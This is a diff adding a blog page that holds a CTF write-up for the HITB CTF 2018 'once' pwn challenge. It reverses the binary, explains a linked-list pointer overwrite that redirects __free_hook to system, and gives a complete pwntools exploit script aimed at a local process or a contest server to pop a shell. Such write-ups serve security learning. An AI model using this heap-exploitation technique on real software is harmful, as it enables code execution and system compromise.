@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitbctf2018-once">
+<meta property="og:url" content="http://yoursite.com/2018/06/05/hitbctf2018-once/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f1.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f2.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f3.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f41.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f42.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f43.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/2.png">
+<meta property="og:updated_time" content="2018-06-27T14:03:04.724Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hitbctf2018-once">
+<meta name="twitter:description" content="once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的">
+<meta name="twitter:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/06/05/hitbctf2018-once/"/>
+
+
+
+
+
+  <title>hitbctf2018-once | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/05/hitbctf2018-once/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hitbctf2018-once</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-05T23:30:28+08:00">
+                2018-06-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p><em>once名字的来由大概是很多操作都只能做一次（误）</em></p>
+<p>先执行二进制文件，根据输出的字符串定位各个函数。</p>
+<p><strong>f1</strong>：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的<code>&amp;unk_202020</code>，其中<code>unk_202020[3]</code>为<code>off_202038</code>。新加入的结点插入到头部，用<code>off_202038</code>进行记录。这个逻辑我还是想了一会的，果然要多读源码。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f1.png" alt="f1函数"></p>
+<p><strong>f2：</strong>在bss段有一个变量<code>dword_202064</code>，作为是否进行了写操作的标志。函数实现了向第一个结点内写入0x20个字节，这个功能仅能实现一次。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f2.png" alt="f2函数"></p>
+<p><strong>f3：</strong>同样，bss有一个<code>dword_202060</code>变量，标识是否进行了结点删除的操作。函数实现了删除第一个结点。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f3.png" alt="f3函数"></p>
+<p><strong>f4：</strong>函数里有一些子操作，输入1时，分配size大小的内存空间，并把对应标志置位。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f41.png" alt="f4-1"></p>
+<p>​    输入2时，向ptr内输入size大小的内容。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f42.png" alt="f4-2"></p>
+<p>​    输入3时，释放ptr内存。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f43.png" alt="f4-3"></p>
+<h2 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><p>在f2里，用户可以输入0x20个字节，能够覆盖掉结点中的前后向指针。并且在f3的解链操作中，对前后向指针进行操作，能够将程序劫持到期待的位置。简称<code>offset_202038</code>为<code>first``,unk_202020</code>为<code>head</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   			<span class="comment">//f2向结点内写内容，覆盖node[3]的地址为addr</span></span><br><span class="line"><span class="comment">//first里记录的是node的地址</span></span><br><span class="line">first = *(first+<span class="number">3</span>)</span><br><span class="line"><span class="comment">//first = addr                        </span></span><br><span class="line">   			*(first+<span class="number">2</span>)=&amp;head</span><br><span class="line">   			<span class="comment">//*(addr+2)=&amp;head</span></span><br></pre></td></tr></table></figure>
+<p>可以看出，最终能够实现向<code>addr+16</code>的地址处写入head地址。由于f4后续可以操作ptr变量，就使得<code>addr+16=&amp;ptr</code>，经过上述过程后，ptr的内容为head地址，那么后面就可以向data段和bss段任意写。</p>
+<p>本题开启了PIE保护，也就是无法直接获取到GOT，BSS变量地址。实际上，二进制文件中的相对位置是不变的。由于.data段与.bss段相邻，且相差较少，可以通过修改最后一个个字节来修改node[3]的内容。<code>addr = &amp;ptr-16 = 0x202058</code>，发送最后一个字节0x58即可。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/1.png" alt=""></p>
+<p><img src="/2018/06/05/hitbctf2018-once/2.png" alt="data段和bss段地址"></p>
+<p>之后f4向ptr写入内容就相当于向<code>unk_202020</code>起始的位置写入内容。由于f2能够向<code>off_202038</code>中的地址写入内容，不妨将offset_202038的值写为 <code>__free_hook</code>的地址，之后调用f2就可以向这里写入<code>system</code>地址。为了再次利用f2函数，应该覆写位于bss中的dword_202064变量。这样，覆写了 <code>__free_hook</code>之后，再次调用free就会执行<code>system</code>，f4中的3调用了<code>free</code>函数，对ptr中地址进行释放，因此可以将ptr中的值覆写为<code>/bin/sh</code>的地址。</p>
+<p>一共要进行三次写操作：</p>
+<p>1.f2向<code>offset_202038</code>中写入24字节填充和1字节0x58覆盖后向指针</p>
+<p>2.f4-2向ptr中写入<code>__free_hook</code>地址、<code>/bin/sh</code>地址和对一些标识位置位。</p>
+<p>3.f2向<code>offset_202038</code>（<code>__free_hook</code>）写入<code>system</code>地址</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./once'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./once'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.75.189.102'</span>, <span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_1</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_2</span><span class="params">(string)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(string)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_3</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Invalid choice\n'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#add a node</span></span><br><span class="line">fun_1()</span><br><span class="line"><span class="comment">#f4:ptr=malloc 0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="comment">#input node </span></span><br><span class="line">fun_2(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">8</span> + chr(<span class="number">0x58</span>))</span><br><span class="line"><span class="comment">#remove node</span></span><br><span class="line">fun_3()</span><br><span class="line"><span class="comment">#write ptr</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+ <span class="string">'\0'</span>*<span class="number">0x10</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]) + p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] )+ p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) +p64(<span class="number">0</span>)*<span class="number">4</span> )</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/05/fastbin-attack-search/" rel="next" title="fastbin_attack-search">
+                <i class="fa fa-chevron-left"></i> fastbin_attack-search
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/05/suctf2018-note/" rel="prev" title="suctf2018-note">
+                suctf2018-note <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#once"><span class="nav-number">1.</span> <span class="nav-text">once</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本逻辑"><span class="nav-number">1.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞及利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞及利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用脚本"><span class="nav-number">1.3.</span> <span class="nav-text">利用脚本</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
